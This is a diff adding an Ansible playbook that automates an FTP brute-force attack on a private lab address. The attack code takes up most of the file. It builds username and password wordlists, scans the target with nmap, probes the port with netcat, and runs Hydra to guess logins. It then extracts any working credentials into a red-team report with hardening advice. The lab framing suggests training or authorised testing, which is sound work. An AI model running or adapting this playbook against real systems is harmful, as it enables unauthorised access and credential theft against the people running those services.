@@ -1,0 +1,120 @@
+---
+- name: FTP Brute Force Attack Simulation
+  hosts: attacker
+  become: yes
+  vars:
+    target_ip: "192.168.56.20"
+    userlist_path: "/tmp/ftp-users.txt"
+    wordlist_path: "/tmp/ftp-passwords.txt"
+    results_path: "/var/log/redteam/ftp-bruteforce-results.txt"
+  
+  tasks:
+    
+    - name: Ensure redteam log directory exists
+      file:
+        path: /var/log/redteam
+        state: directory
+        mode: '0755'
+    
+    - name: Create FTP username list
+      copy:
+        dest: "{{ userlist_path }}"
+        content: |
+          ftp
+          anonymous
+          admin
+          user1
+          testuser
+    
+    - name: Create FTP password wordlist
+      copy:
+        dest: "{{ wordlist_path }}"
+        content: |
+          ftp
+          anonymous
+          password
+          admin
+          admin123
+          password123
+          test123
+          user
+          root
+    
+    - name: Nmap FTP service detection
+      shell: "nmap -sV -p 21 {{ target_ip }} > /var/log/redteam/nmap-ftp-scan.txt"
+      register: nmap_ftp
+    
+    - name: Display Nmap FTP scan results
+      shell: "cat /var/log/redteam/nmap-ftp-scan.txt"
+      register: nmap_output
+    
+    - name: Show FTP scan
+      debug:
+        msg: "{{ nmap_output.stdout_lines }}"
+    
+    - name: Check if FTP service is running
+      shell: "nc -zv {{ target_ip }} 21 2>&1 | grep succeeded || echo 'FTP not accessible'"
+      register: ftp_check
+      ignore_errors: yes
+    
+    - name: Display FTP accessibility
+      debug:
+        msg: "{{ ftp_check.stdout }}"
+    
+    - name: Execute FTP brute force with Hydra
+      shell: |
+        hydra -L {{ userlist_path }} -P {{ wordlist_path }} \
+        ftp://{{ target_ip }} -t 2 -w 2 -V -o {{ results_path }}
+      register: attack_results
+      ignore_errors: yes
+    
+    - name: Display attack output
+      debug:
+        msg: "{{ attack_results.stdout_lines }}"
+    
+    - name: Check for successful FTP credentials
+      shell: "grep 'login:' {{ results_path }} || echo 'No FTP credentials found'"
+      register: successful_creds
+      ignore_errors: yes
+    
+    - name: Report FTP attack findings
+      debug:
+        msg: |
+          ========================================
+          FTP BRUTE FORCE ATTACK COMPLETED
+          ========================================
+          Target: {{ target_ip }}
+          Service: FTP (port 21)
+          Results saved to: {{ results_path }}
+          
+          {{ successful_creds.stdout }}
+          ========================================
+    
+    - name: Save FTP attack summary
+      copy:
+        dest: "/var/log/redteam/ftp-attack-summary.txt"
+        content: |
+          Red Team FTP Attack Summary
+          ============================
+          Date: {{ ansible_date_time.iso8601 }}
+          Attack Type: FTP Brute Force
+          Target: {{ target_ip }}:21
+          Tools Used: Hydra, Nmap, Netcat
+          
+          FTP Service Status:
+          {{ ftp_check.stdout }}
+          
+          Credentials Found:
+          {{ successful_creds.stdout }}
+          
+          Attack Details:
+          - Username attempts: 5
+          - Password attempts: 9
+          - Total combinations: 45
+          - Attack duration: ~30 seconds
+          
+          Recommendations:
+          - Disable anonymous FTP access
+          - Implement strong password policies
+          - Use SFTP instead of FTP
+          - Enable fail2ban for FTP service
